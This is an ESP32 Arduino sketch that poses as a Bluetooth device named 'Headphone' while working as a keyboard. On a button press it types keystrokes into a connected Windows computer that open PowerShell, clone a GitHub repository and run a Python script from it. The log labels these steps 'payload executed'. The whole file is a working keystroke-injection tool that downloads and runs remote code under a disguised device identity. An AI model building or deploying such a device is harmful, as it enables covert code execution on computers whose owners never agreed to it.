#include <BleKeyboard.h>

#define BUTTON_1_PIN 16 // Button 1 (Trigger: Password Manager)
#define BUTTON_2_PIN 17 // Button 2 (Trigger: Secret Messaging)

char kbd[] = "Headphone"; // Device Name
BleKeyboard bleKeyboard(kbd, "Espressif", 100);

bool lastState1 = HIGH;
bool lastState2 = HIGH;

void sendString(const char* s, int charDelay = 10) {
  for (size_t i = 0; i < strlen(s); i++) {
    bleKeyboard.print(s[i]);
    delay(charDelay);
  }
}

void setup() {
  Serial.begin(115200);
  Serial.println("Starting BLE HID setup with 2 Triggers on Buttons 1-2 (Pins 16, 17)...");

  pinMode(BUTTON_1_PIN, INPUT_PULLUP);
  pinMode(BUTTON_2_PIN, INPUT_PULLUP);

  Serial.println("Initializing BLE...");
  delay(1000);
  bleKeyboard.begin();
  Serial.println("BLE ready. Connect as 'Headphone'.");
}

void loop() {
  if (bleKeyboard.isConnected()) {
    bool state1 = digitalRead(BUTTON_1_PIN);
    bool state2 = digitalRead(BUTTON_2_PIN);

    // Button 1: Password Manager (Pin 16)
    if (lastState1 == HIGH && state1 == LOW) {
      Serial.println("Button 1: Password Manager (Pin 16)");
      bleKeyboard.press(KEY_LEFT_GUI); delay(100); 
      bleKeyboard.releaseAll(); delay(1000);
      sendString("powershell", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(7000);
      sendString("git clone https://github.com/sachinpandey7709/Password-Manager.git", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(7000);
      sendString("cd Password-Manager", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(3000);
      sendString("python password.py", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(3000);
      Serial.println("Password Manager Payload executed");
    }

    // Button 2: Secret Messaging (Pin 17)
    if (lastState2 == HIGH && state2 == LOW) {
      Serial.println("Button 2: Secret Messaging (Pin 17)");
      bleKeyboard.press(KEY_LEFT_GUI); delay(100); 
      bleKeyboard.releaseAll(); delay(1000);
      sendString("powershell", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(7000);
      sendString("git clone https://github.com/sachinpandey7709/Secret-Messaging.git", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(7000);
      sendString("cd Secret-Messaging", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(3000);
      sendString("python code2.py", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(3000);
      Serial.println("Secret Messaging Payload executed");
    }

    lastState1 = state1;
    lastState2 = state2;
  } else {
    Serial.println("Waiting for BLE connection...");
  }
  delay(50); // Debounce/stability
}
